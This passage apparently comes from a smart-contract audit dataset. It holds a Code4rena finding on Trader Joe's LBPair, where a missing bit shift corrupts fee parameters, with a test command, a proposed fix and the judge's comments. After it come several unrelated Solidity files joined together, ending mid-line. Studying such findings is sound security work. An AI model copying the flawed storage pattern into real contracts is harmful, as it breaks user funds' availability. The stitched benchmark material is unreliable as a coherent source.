bits...][....144 bits.....]\n    _varParameters][_newFeeParameters]\n\nIt will make feeParameters = _newFeeParameters | (_varParameters << 144). But current implementation just stores the or value of _varParameters and _newFeeParameter into _feeParameters.slot. It forgot to shift left the _varParameters 144 bits before executing or operation.\n\nThis will make the value of binStep, ..., maxVolatilityAccumulated incorrect, and also remove the value (make the bit equal to 0) of volatilityAccumulated, ..., time.\n\n\n*   Incorrect fee calculation when executing an action with LBPair (swap, flashLoan, mint)\n*   Break the functionality of LBPair. The user can't swap/mint/flashLoan\n\n-- Make all the tokens stuck in the pools\n\n\nHere is our test script to describe the impacts\n\n*   <https://gist.github.com/WelToHackerLand/012e44bb85420fb53eb0bbb7f0f13769\n\nYou can place this file into /test folder and run it using\n\n\nforge test --match-contract High1Test -vv\n\n\nExplanation of test script:\n\n1.  First we create a pair with binStep = DEFAULT_BIN_STEP = 25\n2.  We do some actions (add liquidity - mint - swap) to increase the value of volatilityAccumulated from 0 to 60000\n3.  We call function factory.setFeeParametersOnPair to set new fee parameters.\n4.  After that the value of volatilityAccumulated changed to value 0 (It should still be unchanged after factory.setFeeParametersOnPair)\n5.  We check the value of binStep and it changed from25 to 60025\n    *   binStep has that value because line 915(https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L915) set binStep = uint16(volatilityAccumulated) | binStep = 60000 | 25 = 60025.\n6.  This change of binStep value will break all the functionality of LBPair cause binStep  Constant.BASIS_POINT_MAX = 10000 -- Error: BinStepOverflows\n\n\nFoundry\n\n",
                "Repair": "\nModify function LBPair._setFeesParaters as follow:\n\nsolidity\n/// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917\nfunction _setFeesParameters(bytes32 _packedFeeParameters) internal {\n    bytes32 _feeStorageSlot;\n    assembly {\n        _feeStorageSlot := sload(_feeParameters.slot)\n    }\n\n\n    uint256 _varParameters = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS);\n    uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);\n\n\n    assembly {\n        sstore(_feeParameters.slot, or(_newFeeParameters, shl(144, _varParameters)))\n    }\n}\n\n\n0x0Louis (Trader Joe) confirmed(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384)\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384#issuecomment-1310455200):\n  The warden has shown how, due to a missing shift, packed settings for feeParameters will be improperly stored, causing undefined behaviour.\n \n The mistake can be trivially fixed and the above code offers a test case for remediation.\n \n Because the finding impacts the protocol functionality, despite it's perceived simplicity, I agree with High Severity as the code is not working as intended in a fundamental way.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.5.0;\n\nimport \"../src/test.sol\";\n\ncontract DemoTest is DSTest {\n    function test_this() public pure {\n        require(true);\n    }\n    function test_logs() public {\n        emit log(\"-- log(string)\");\n        emit log(\"a string\");\n\n        emit log(\"-- log_named_uint(string, uint)\");\n        emit log_named_uint(\"uint\", 512);\n\n        emit log(\"-- log_named_int(string, int)\");\n        emit log_named_int(\"int\", -512);\n\n        emit log(\"-- log_named_address(string, address)\");\n        emit log_named_address(\"address\", address(this));\n\n        emit log(\"-- log_named_bytes32(string, bytes32)\");\n        emit log_named_bytes32(\"bytes32\", \"a string\");\n\n        emit log(\"-- log_named_bytes(string, bytes)\");\n        emit log_named_bytes(\"bytes\", hex\"cafefe\");\n\n        emit log(\"-- log_named_string(string, string)\");\n        emit log_named_string(\"string\", \"a string\");\n\n        emit log(\"-- log_named_decimal_uint(string, uint, uint)\");\n        emit log_named_decimal_uint(\"decimal uint\", 1.0e18, 18);\n\n        emit log(\"-- log_named_decimal_int(string, int, uint)\");\n        emit log_named_decimal_int(\"decimal int\", -1.0e18, 18);\n    }\n    event log_old_named_uint(bytes32,uint);\n    function test_old_logs() public {\n        emit log_old_named_uint(\"key\", 500);\n        emit log_named_bytes32(\"bkey\", \"val\");\n    }\n    function test_trace() public view {\n        this.echo(\"string 1\", \"string 2\");\n    }\n    function test_multiline() public {\n        emit log(\"a multiline\\\\nstring\");\n        emit log(\"a multiline string\");\n        emit log_bytes(\"a string\");\n        emit log_bytes(\"a multiline\\nstring\");\n        emit log_bytes(\"a multiline\\\\nstring\");\n        emit logs(hex\"0000\");\n        emit log_named_bytes(\"0x0000\", hex\"0000\");\n        emit logs(hex\"ff\");\n    }\n    function echo(string memory s1, string memory s2) public pure\n        returns (string memory, string memory)\n    {\n        return (s1, s2);\n    }\n\n    function prove_this(uint x) public {\n        emit log_named_uint(\"sym x\", x);\n        assertGt(x + 1, 0);\n    }\n\n    function test_logn() public {\n        assembly {\n            log0(0x01, 0x02)\n            log1(0x01, 0x02, 0x03)\n            log2(0x01, 0x02, 0x03, 0x04)\n            log3(0x01, 0x02, 0x03, 0x04, 0x05)\n        }\n    }\n\n    event MyEvent(uint, uint indexed, uint, uint indexed);\n    function test_events() public {\n        emit MyEvent(1, 2, 3, 4);\n    }\n\n    function test_asserts() public {\n        string memory err = \"this test has failed!\";\n        emit log(\"## assertTrue(bool)\\n\");\n        assertTrue(false);\n        emit log(\"\\n\");\n        assertTrue(false, err);\n\n        emit log(\"\\n## assertEq(address,address)\\n\");\n        assertEq(address(this), msg.sender);\n        emit log(\"\\n\");\n        assertEq(address(this), msg.sender, err);\n\n        emit log(\"\\n## assertEq32(bytes32,bytes32)\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\");\n        emit log(\"\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\", err);\n\n        emit log(\"\\n## assertEq(bytes32,bytes32)\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\");\n        emit log(\"\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\", err);\n\n        emit log(\"\\n## assertEq(uint,uint)\\n\");\n        assertEq(uint(0), 1);\n        emit log(\"\\n\");\n        assertEq(uint(0), 1, err);\n\n        emit log(\"\\n## assertEq(int,int)\\n\");\n        assertEq(-1, -2);\n        emit log(\"\\n\");\n        assertEq(-1, -2, err);\n\n        emit log(\"\\n## assertEqDecimal(int,int,uint)\\n\");\n        assertEqDecimal(-1.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertEqDecimal(-1.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertEqDecimal(uint,uint,uint)\\n\");\n        assertEqDecimal(uint(1.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertEqDecimal(uint(1.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertGt(uint,uint)\\n\");\n        assertGt(uint(0), 0);\n        emit log(\"\\n\");\n        assertGt(uint(0), 0, err);\n\n        emit log(\"\\n## assertGt(int,int)\\n\");\n        assertGt(-1, -1);\n        emit log(\"\\n\");\n        assertGt(-1, -1, err);\n\n        emit log(\"\\n## assertGtDecimal(int,int,uint)\\n\");\n        assertGtDecimal(-2.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertGtDecimal(-2.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertGtDecimal(uint,uint,uint)\\n\");\n        assertGtDecimal(uint(1.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertGtDecimal(uint(1.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertGe(uint,uint)\\n\");\n        assertGe(uint(0), 1);\n        emit log(\"\\n\");\n        assertGe(uint(0), 1, err);\n\n        emit log(\"\\n## assertGe(int,int)\\n\");\n        assertGe(-1, 0);\n        emit log(\"\\n\");\n        assertGe(-1, 0, err);\n\n        emit log(\"\\n## assertGeDecimal(int,int,uint)\\n\");\n        assertGeDecimal(-2.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertGeDecimal(-2.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertGeDecimal(uint,uint,uint)\\n\");\n        assertGeDecimal(uint(1.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertGeDecimal(uint(1.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertLt(uint,uint)\\n\");\n        assertLt(uint(0), 0);\n        emit log(\"\\n\");\n        assertLt(uint(0), 0, err);\n\n        emit log(\"\\n## assertLt(int,int)\\n\");\n        assertLt(-1, -1);\n        emit log(\"\\n\");\n        assertLt(-1, -1, err);\n\n        emit log(\"\\n## assertLtDecimal(int,int,uint)\\n\");\n        assertLtDecimal(-1.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertLtDecimal(-1.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertLtDecimal(uint,uint,uint)\\n\");\n        assertLtDecimal(uint(2.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertLtDecimal(uint(2.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertLe(uint,uint)\\n\");\n        assertLe(uint(1), 0);\n        emit log(\"\\n\");\n        assertLe(uint(1), 0, err);\n\n        emit log(\"\\n## assertLe(int,int)\\n\");\n        assertLe(0, -1);\n        emit log(\"\\n\");\n        assertLe(0, -1, err);\n\n        emit log(\"\\n## assertLeDecimal(int,int,uint)\\n\");\n        assertLeDecimal(-1.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertLeDecimal(-1.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertLeDecimal(uint,uint,uint)\\n\");\n        assertLeDecimal(uint(2.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertLeDecimal(uint(2.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertEq(string,string)\\n\");\n        string memory s1 = \"string 1\";\n        string memory s2 = \"string 2\";\n        assertEq(s1, s2);\n        emit log(\"\\n\");\n        assertEq(s1, s2, err);\n\n        emit log(\"\\n## assertEq0(bytes,bytes)\\n\");\n        assertEq0(hex\"abcdef01\", hex\"abcdef02\");\n        emit log(\"\\n\");\n        assertEq0(hex\"abcdef01\", hex\"abcdef02\", err);\n    }\n}\n\ncontract DemoTestWithSetUp {\n    function setUp() public {\n    }\n    function test_pass() public pure {\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./LBErrors.sol\";\nimport \"./libraries/BinHelper.sol\";\nimport \"./libraries/JoeLibrary.sol\";\nimport \"./libraries/Math512Bits.sol\";\nimport \"./interfaces/IJoeFactory.sol\";\nimport \"./interfaces/IJoePair.sol\";\nimport \"./interfaces/ILBFactory.sol\";\nimport \"./interfaces/ILBRouter.sol\";\n\n/// @title Liquidity Book Quoter\n/// @author Trader Joe\n/// @notice Helper contract to determine best path through multiple markets\ncontract LBQuoter {\n    using Math512Bits for uint256;\n\n    /// @notice Dex V2 router address\n    address public immutable routerV2;\n    /// @notice Dex V1 factory address\n    address public immutable factoryV1;\n    /// @notice Dex V2 factory address\n    address public immutable factoryV2;\n\n    struct Quote {\n        address[] route;\n        address[] pairs;\n        uint256[] binSteps;\n        uint256[] amounts;\n        uint256[] virtualAmountsWithoutSlippage;\n        uint256[] fees;\n    }\n\n    /// @notice Constructor\n    /// @param _routerV2 Dex V2 router address\n    /// @param _factoryV1 Dex V1 factory address\n    /// @param _factoryV2 Dex V2 factory address\n    constructor(\n        address _routerV2,\n        address _factoryV1,\n        address _factoryV2\n    ) {\n        routerV2 = _routerV2;\n        factoryV1 = _factoryV1;\n        factoryV2 = _factoryV2;\n    }\n\n    /// @notice Finds the best path given a list of tokens and the input amount wanted from the swap\n    /// @param _route List of the tokens to go through\n    /// @param _amountIn Swap amount in\n    /// @return quote The Quote structure containing the necessary element to perform the swap\n    function findBestPathFromAmountIn(address[] memory _route, uint256 _amountIn)\n        public\n        view\n        returns (Quote memory quote)\n    {\n        if (_route.length < 2) {\n            revert LBQuoter_InvalidLength();\n        }\n\n        quote.route = _route;\n\n        uint256 swapLength = _route.length - 1;\n        quote.pairs = new address[](swapLength);\n        quote.binSteps = new uint256[](swapLength);\n        quote.fees = new uint256[](swapLength);\n        quote.amounts = new uint256[](_route.length);\n        quote.virtualAmountsWithoutSlippage = new uint256[](_route.length);\n\n        quote.amounts[0] = _amountIn;\n        quote.virtualAmountsWithoutSlippage[0] = _amountIn;\n\n        for (uint256 i; i < swapLength; i++) {\n            // Fetch swap for V1\n            quote.pairs[i] = IJoeFactory(factoryV1).getPair(_route[i], _route[i + 1]);\n\n            if (quote.pairs[i] != address(0) && quote.amounts[i] > 0) {\n                (uint256 reserveIn, uint256 reserveOut) = _getReserves(quote.pairs[i], _route[i], _route[i + 1]);\n\n                if (reserveIn > 0 && reserveOut > 0) {\n                    quote.amounts[i + 1] = JoeLibrary.getAmountOut(quote.amounts[i], reserveIn, reserveOut);\n                    quote.virtualAmountsWithoutSlippage[i + 1] = JoeLibrary.quote(\n                        (quote.virtualAmountsWithoutSlippage[i] * 997) / 1000,\n                        reserveIn,\n                        reserveOut\n                    );\n                    quote.fees[i] = 0.003e18; // 0.3%\n                }\n            }\n\n            // Fetch swaps for V2\n            ILBFactory.LBPairInformation[] memory LBPairsAvailable = ILBFactory(factoryV2).getAllLBPairs(\n                IERC20(_route[i]),\n                IERC20(_route[i + 1])\n            );\n\n            if (LBPairsAvailable.length > 0 && quote.amounts[i] > 0) {\n                for (uint256 j; j < LBPairsAvailable.length; j++) {\n                    if (!LBPairsAvailable[j].ignoredForRouting) {\n                        bool swapForY = address(LBPairsAvailable[j].LBPair.tokenY()) == _route[i + 1];\n\n                        try\n                            ILBRouter(routerV2).getSwapOut(LBPairsAvailable[j].LBPair, quote.amounts[i], swapForY)\n                        returns (uint256 swapAmountOut, uint256 fees) {\n                            if (swapAmountOut > quote.amounts[i + 1]) {\n                                quote.amounts[i + 1] = swapAmountOut;\n                                quote.pairs[i] = address(LBPairsAvailable[j].LBPair);\n                                quote.binSteps[i] = LBPairsAvailable[j].binStep;\n\n                                // Getting current price\n                                (, , uint256 activeId) = LBPairsAvailable[j].LBPair.getReservesAndId();\n                                quote.virtualAmountsWithoutSlippage[i + 1] = _getV2Quote(\n                                    quote.virtualAmountsWithoutSlippage[i] - fees,\n                                    activeId,\n                                    quote.binSteps[i],\n                                    swapForY\n                                );\n\n                                quote.fees[i] = (fees * 1e18) / quote.amounts[i]; // fee percentage in amountIn\n                            }\n                        } catch {}\n                    }\n                }\n            }\n        }\n    }\n\n    /// @notice Finds the best path given a list of tokens and the output amount wanted from the swap\n    /// @param _route List of the tokens to go through\n    /// @param _amountOut Swap amount out\n    /// @return quote The Quote structure containing the necessary element to perform the swap\n    function findBestPathFromAmountOut(address[] memory _route, uint256 _amountOut)\n        public\n        view\n        returns (Quote memory quote)\n    {\n        if (_route.length < 2) {\n            revert LBQuoter_InvalidLength();\n        }\n        quote.route = _route;\n\n        uint256 swapLength = _route.length - 1;\n        quote.pairs = new address[](swapLength);\n        quote.binSteps = new uint256[](swapLength);\n        quote.fees = new uint256[](swapLength);\n        quote.amounts = new uint256[](_route.length);\n        quote.virtualAmountsWithoutSlippage = new uint256[](_route.length);\n\n        quote.amounts[swapLength] = _amountOut;\n        quote.virtualAmountsWithoutSlippage[swapLength] = _amountOut;\n\n        for (uint256 i = swapLength; i > 0; i--) {\n            // Fetch swap for V1\n            quote.pairs[i - 1] = IJoeFactory(factoryV1).getPair(_route[i - 1], _route[i]);\n            if (quote.pairs[i - 1] != address(0) && quote.amounts[i] > 0) {\n                (uint256 reserveIn, uint256 reserveOut) = _getReserves(quote.pairs[i - 1], _route[i - 1], _route[i]);\n\n                if (reserveIn > 0 && reserveOut > quote.amounts[i]) {\n                    quote.amounts[i - 1] = JoeLibrary.getAmountIn(quote.amounts[i], reserveIn, reserveOut);\n                    quote.virtualAmountsWithoutSlippage[i - 1] =\n                        (JoeLibrary.quote(quote.virtualAmountsWithoutSlippage[i], reserveOut, reserveIn) * 1000) /\n                        997;\n\n                    quote.fees[i - 1] = 0.003e18; // 0.3%\n                }\n            }\n\n            // Fetch swaps for V2\n            ILBFactory.LBPairInformation[] memory LBPairsAvailable = ILBFactory(factoryV2).getAllLBPairs(\n                IERC20(_route[i - 1]),\n                IERC20(_route[i])\n            );\n\n            if (LBPairsAvailable.length > 0 && quote.amounts[i] > 0) {\n                for (uint256 j; j < LBPairsAvailable.length; j++) {\n                    if (!LBPairsAvailable[j].ignoredForRouting) {\n                        bool swapForY = address(LBPairsAvailable[j].LBPair.tokenY()) == _route[i];\n                        try\n                            ILBRouter(routerV2).getSwapIn(LBPairsAvailable[j].LBPair, quote.amounts[i], swapForY)\n                        returns (uint256 swapAmountIn, uint256 fees) {\n                            if (\n                                swapAmountIn != 0 && (swapAmountIn < quote.amounts[i - 1] || quote.amounts[i - 1] == 0)\n                            ) {\n                                quote.amounts[i - 1] = swapAmountIn;\n                                quote.pairs[i - 1] = address(LBPairsAvailable[j].LBPair);\n                                quote.binSteps[i - 1] = LBPairsAvailable[j].binStep;\n\n                                // Getting current price\n                                (, , uint256 activeId) = LBPairsAvailable[j].LBPair.getReservesAndId();\n                                quote.virtualAmountsWithoutSlippage[i - 1] =\n                                    _getV2Quote(\n                                        quote.virtualAmountsWithoutSlippage[i],\n                                        activeId,\n                                        quote.binSteps[i - 1],\n                                        !swapForY\n                                    ) +\n                                    fees;\n\n                                quote.fees[i - 1] = (fees * 1e18) / quote.amounts[i - 1]; // fee percentage in amountIn\n                            }\n                        } catch {}\n                    }\n                }\n            }\n        }\n    }\n\n    /// @dev Forked from JoeLibrary\n    /// @dev Doesn't rely on the init code hash of the factory\n    /// @param _pair Address of the pair\n    /// @param _tokenA Address of token A\n    /// @param _tokenB Address of token B\n    /// @return reserveA Reserve of token A in the pair\n    /// @return reserveB Reserve of token B in the pair\n    function _getReserves(\n        address _pair,\n        address _tokenA,\n        address _tokenB\n    ) internal view returns (uint256 reserveA, uint256 reserveB) {\n        (address token0, ) = JoeLibrary.sortTokens(_tokenA, _tokenB);\n        (uint256 reserve0, uint256 reserve1, ) = IJoePair(_pair).getReserves();\n        (reserveA, reserveB) = _tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n    }\n\n    /// @dev Calculates a quote for a V2 pair\n    /// @param _amount Amount in to consider\n    /// @param _activeId Current active Id of the considred pair\n    /// @param _binStep Bin step of the considered pair\n    /// @param _swapForY Boolean describing if we are swapping from X to Y or the opposite\n    /// @return quote Amount Out if _amount was swapped with no slippage and no fees\n    function _getV2Quote(\n        uint256 _amount,\n        uint256 _activeId,\n        uint256 _binStep,\n        bool _swapForY\n    ) internal pure returns (uint256 quote) {\n        if (_swapForY) {\n            quote = BinHelper.getPriceFromId(_activeId, _binStep).mulShiftRoundDown(_amount, Constants.SCALE_OFFSET);\n        } else {\n            quote = _amount.shiftDivRoundDown(Constants.SCALE_OFFSET, BinHelper.getPriceFromId(_activeId, _binStep));\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.0;\n\n/// @title Joe V1 Factory Interface\n/// @notice Interface to interact with Joe V1 Factory\ninterface IJoeFactory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);\n\n    function feeTo() external view returns (address);\n\n    function feeToSetter() external view returns (address);\n\n    function migrator() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n\n    function allPairs(uint256) external view returns (address pair);\n\n    function allPairsLength() external view returns (uint256);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n\n    function setFeeToSetter(address) external;\n\n    function setMigrator(address) external;\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.2;\n\nimport \"../munged/governance/Governor.sol\";\nimport \"../munged/governance/extensions/GovernorCountingSimple.sol\";\nimport \"../munged/governance/extensions/GovernorVotes.sol\";\nimport \"../munged/governance/extensions/GovernorVotesQuorumFraction.sol\";\nimport \"../munged/governance/extensions/GovernorTimelockControl.sol\";\nimport \"../munged/governance/extensions/GovernorProposalThreshold.sol\";\n\n/* \nWizard options:\nProposalThreshhold = 10\nERC20Votes\nTimelockController\n*/\n\ncontract WizardControlFirstPriority is Governor, GovernorProposalThreshold, GovernorCountingSimple, GovernorVotes, GovernorVotesQuorumFraction, GovernorTimelockControl {\n    constructor(ERC20Votes _token, TimelockController _timelock, string memory name, uint256 quorumFraction)\n        Governor(name)\n        GovernorVotes(_token)\n        GovernorVotesQuorumFraction(quorumFraction)\n        GovernorTimelockControl(_timelock)\n    {}\n\n    //HARNESS\n\n    function isExecuted(uint256 proposalId) public view returns (bool) {\n        return _proposals[proposalId].executed;\n    }\n    \n    function isCanceled(uint256 proposalId) public view returns (bool) {\n        return _proposals[proposalId].canceled;\n    }\n\n    uint256 _votingDelay;\n\n    uint256 _votingPeriod;\n\n    uint256 _proposalThreshold;\n\n    mapping(uint256 => uint256) public ghost_sum_vote_power_by_id;\n\n    function _castVote(\n        uint256 proposalId,\n        address account,\n        uint8 support,\n        string memory reason\n    ) internal override virtual returns (uint256) {\n        \n        uint256 deltaWeight = super._castVote(proposalId, account, support, reason);  //HARNESS\n        ghost_sum_vote_power_by_id[proposalId] += deltaWeight;\n\n        return deltaWeight;        \n    }\n    \n    function snapshot(uint256 proposalId) public view returns (uint64) {\n        return _proposals[proposalId].voteStart._deadline;\n    }\n\n\n    function getExecutor() public view returns (address){\n        return _executor();\n    }\n\n    // original code, harnessed\n\n    function votingDelay() public view override returns (uint256) {     // HARNESS: pure -> view\n        return _votingDelay;                                            // HARNESS: parametric\n    }\n\n    function votingPeriod() public view override returns (uint256) {    // HARNESS: pure -> view\n        return _votingPeriod;                                           // HARNESS: parametric\n    }\n\n    function proposalThreshold() public view override returns (uint256) {   // HARNESS: pure -> view\n        return _proposalThreshold;                                          // HARNESS: parametric\n    }\n\n    // original code, not harnessed\n    // The following functions are overrides required by Solidity.\n\n    function quorum(uint256 blockNumber)\n        public\n        view\n        override(IGovernor, GovernorVotesQuorumFraction)\n        returns (uint256)\n    {\n        return super.quorum(blockNumber);\n    }\n\n    function getVotes(address account, uint256 blockNumber)\n        public\n        view\n        override(IGovernor, GovernorVotes)\n        returns (uint256)\n    {\n        return super.getVotes(account, blockNumber);\n    }\n\n    function state(uint256 proposalId)\n        public\n        view\n        override(Governor, GovernorTimelockControl)\n        returns (ProposalState)\n    {\n        return super.state(proposalId);\n    }\n\n    function propose(address[] memory targets, uint256[] memory values, bytes[] memory calldatas, string memory description)\n        public\n        override(Governor, GovernorProposalThreshold, IGovernor)\n        returns (uint256)\n    {\n        return super.propose(targets, values, calldatas, description);\n    }\n\n    function _execute(uint256 proposalId, address[] memory targets, uint256[] memory values, bytes[] memory calldatas, bytes32 descriptionHash)\n        internal\n        override(Governor, GovernorTimelockControl)\n    {\n        super._execute(proposalId, targets, values, calldatas, descriptionHash);\n    }\n\n    function _cancel(address[] memory targets, uint256[] memory values, bytes[] memory calldatas, bytes32 descriptionHash)\n        internal\n        override(Governor, GovernorTimelockControl)\n        returns (uint256)\n    {\n        return super._cancel(targets, values, calldatas, descriptionHash);\n    }\n\n    function _executor()\n        internal\n        view\n        override(Governor, GovernorTimelockControl)\n        returns (address)\n    {\n        return super._executor();\n    }\n\n    function supportsInterface(bytes4 interfaceId)\n        public\n        view\n        override(Governor, GovernorTimelockControl)\n        returns (bool)\n    {\n        return super.supportsInterface(interfaceId);\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./interfaces/ILBPair.sol\";\n\n/** LBRouter errors */\n\nerror LBRouter__SenderIsNotWAVAX();\nerror LBRouter__PairNotCreated(address tokenX, address tokenY, uint256 binStep);\nerror LBRouter__WrongAmounts(uint256 amount, uint256 reserve);\nerror LBRouter__SwapOverflows(uint256 id);\nerror LBRouter__BrokenSwapSafetyCheck();\nerror LBRouter__NotFactoryOwner();\nerror LBRouter__TooMuchTokensIn(uint256 excess);\nerror LBRouter__BinReserveOverflows(uint256 id);\nerror LBRouter__IdOverflows(int256 id);\nerror LBRouter__LengthsMismatch();\nerror LBRouter__WrongTokenOrder();\nerror LBRouter__IdSlippageCaught(uint256 activeIdDesired, uint256 idSlippage, uint256 activeId);\nerror LBRouter__AmountSlippageCaught(uint256 amountXMin, uint256 amountX, uint256 amountYMin, uint256 amountY);\nerror LBRouter__IdDesiredOverflows(uint256 idDesired, uint256 idSlippage);\nerror LBRouter__FailedToSendAVAX(address recipient, uint256 amount);\nerror LBRouter__DeadlineExceeded(uint256 deadline, uint256 currentTimestamp);\nerror LBRouter__AmountSlippageBPTooBig(uint256 amountSlippage);\nerror LBRouter__InsufficientAmountOut(uint256 amountOutMin, uint256 amountOut);\nerror LBRouter__MaxAmountInExceeded(uint256 amountInMax, uint256 amountIn);\nerror LBRouter__InvalidTokenPath(address wrongToken);\nerror LBRouter__InvalidVersion(uint256 version);\nerror LBRouter__WrongAvaxLiquidityParameters(\n    address tokenX,\n    address tokenY,\n    uint256 amountX,\n    uint256 amountY,\n    uint256 msgValue\n);\n\n/** LBToken errors */\n\nerror LBToken__SpenderNotApproved(address owner, address spender);\nerror LBToken__TransferFromOrToAddress0();\nerror LBToken__MintToAddress0();\nerror LBToken__BurnFromAddress0();\nerror LBToken__BurnExceedsBalance(address from, uint256 id, uint256 amount);\nerror LBToken__LengthMismatch(uint256 accountsLength, uint256 idsLength);\nerror LBToken__SelfApproval(address owner);\nerror LBToken__TransferExceedsBalance(address from, uint256 id, uint256 amount);\n\n/** LBFactory errors */\n\nerror LBFactory__IdenticalAddresses(IERC20 token);\nerror LBFactory__QuoteAssetNotWhitelisted(IERC20 quoteAsset);\nerror LBFactory__QuoteAssetAlreadyWhitelisted(IERC20 quoteAsset);\nerror LBFactory__AddressZero();\nerror LBFactory__LBPairAlreadyExists(IERC20 tokenX, IERC20 tokenY, uint256 _binStep);\nerror LBFactory__LBPairNotCreated(IERC20 tokenX, IERC20 tokenY, uint256 binStep);\nerror LBFactory__DecreasingPeriods(uint16 filterPeriod, uint16 decayPeriod);\nerror LBFactory__BaseFactorOverflows(uint16 baseFactor, uint256 max);\nerror LBFactory__ReductionFactorOverflows(uint16 reductionFactor, uint256 max);\nerror LBFactory__VariableFeeControlOverflows(uint16 variableFeeControl, uint256 max);\nerror LBFactory__BaseFeesBelowMin(uint256 baseFees, uint256 minBaseFees);\nerror LBFactory__FeesAboveMax(uint256 fees, uint256 maxFees);\nerror LBFactory__BinStepRequirementsBreached(uint256 lowerBound, uint16 binStep, uint256 higherBound);\nerror LBFactory__ProtocolShareOverflows(uint16 protocolShare, uint256 max);\nerror LBFactory__FunctionIsLockedForUsers(address user);\nerror LBFactory__FactoryLockIsAlreadyInTheSameState();\nerror LBFactory__LBPairIgnoredIsAlreadyInTheSameState();\nerror LBFactory__BinStepHasNoPreset(uint256 binStep);\nerror LBFactory__SameFeeRecipient(address feeRecipient);\nerror LBFactory__SameFlashLoanFee(uint256 flashLoanFee);\nerror LBFactory__LBPairSafetyCheckFailed(address LBPairImplementation);\nerror LBFactory__SameImplementation(address LBPairImplementation);\nerror LBFactory__ImplementationNotSet();\n\n/** LBPair errors */\n\nerror LBPair__InsufficientAmounts();\nerror LBPair__AddressZero();\nerror LBPair__BrokenSwapSafetyCheck();\nerror LBPair__CompositionFactorFlawed(uint256 id);\nerror LBPair__InsufficientLiquidityMinted(uint256 id);\nerror LBPair__InsufficientLiquidityBurned(uint256 id);\nerror LBPair__WrongLengths();\nerror LBPair__OnlyStrictlyIncreasingId();\nerror LBPair__OnlyFactory();\nerror LBPair__DistributionsOverflow();\nerror LBPair__OnlyFeeRecipient(address feeRecipient, address sender);\nerror LBPair__OracleNotEnoughSample();\nerror LBPair__FlashLoanCallbackFailed();\nerror LBPair__AlreadyInitialized();\nerror LBPair__NewSizeTooSmall(uint256 newSize, uint256 oracleSize);\n\n/** BinHelper errors */\n\nerror BinHelper__BinStepOverflows(uint256 bp);\nerror BinHelper__IdOverflows(int256 id);\nerror BinHelper__IntOverflows(uint256 id);\n\n/** FeeDistributionHelper errors */\n\nerror FeeDistributionHelper__FlashLoanUnderflow(uint256 expectedBalance, uint256 balance);\n\n/** Math128x128 errors */\n\nerror Math128x128__PowerUnderflow(uint256 x, int256 y);\nerror Math128x128__LogUnderflow();\n\n/** Math512Bits errors */\n\nerror Math512Bits__MulDivOverflow(uint256 prod1, uint256 denominator);\nerror Math512Bits__ShiftDivOverflow(uint256 prod1, uint256 denominator);\nerror Math512Bits__MulShiftOverflow(uint256 prod1, uint256 offset);\nerror Math512Bits__OffsetOverflows(uint256 offset);\n\n/** Oracle errors */\n\nerror Oracle__AlreadyInitialized(uint256 _index);\nerror Oracle__LookUpTimestampTooOld(uint256 _minTimestamp, uint256 _lookUpTimestamp);\nerror Oracle__NotInitialized();\n\n/** PendingOwnable errors */\n\nerror PendingOwnable__NotOwner();\nerror PendingOwnable__NotPendingOwner();\nerror PendingOwnable__PendingOwnerAlreadySet();\nerror PendingOwnable__NoPendingOwner();\nerror PendingOwnable__AddressZero();\n\n/** ReentrancyGuardUpgradeable errors */\n\nerror ReentrancyGuardUpgradeable__ReentrantCall();\nerror ReentrancyGuardUpgradeable__AlreadyInitialized();\n\n/** SafeCast errors */\n\nerror SafeCast__Exceeds256Bits(uint256 x);\nerror SafeCast__Exceeds248Bits(uint256 x);\nerror SafeCast__Exceeds240Bits(uint256 x);\nerror SafeCast__Exceeds232Bits(uint256 x);\nerror SafeCast__Exceeds224Bits(uint256 x);\nerror SafeCast__Exceeds216Bits(uint256 x);\nerror SafeCast__Exceeds208Bits(uint256 x);\nerror SafeCast__Exceeds200Bits(uint256 x);\nerror 